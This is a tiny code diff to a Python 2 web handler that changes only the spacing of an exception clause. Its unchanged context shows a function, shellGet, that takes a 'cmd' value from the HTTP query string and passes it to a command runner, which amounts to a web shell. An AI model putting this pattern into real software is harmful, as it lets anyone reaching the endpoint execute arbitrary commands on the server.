@@ -14,6 +14,6 @@ def shellGet():
     try:
         command = request.args.get("cmd")
         result = cmd(command)
-    except Exception,e:
+    except Exception, e:
         print str(e)
     return result
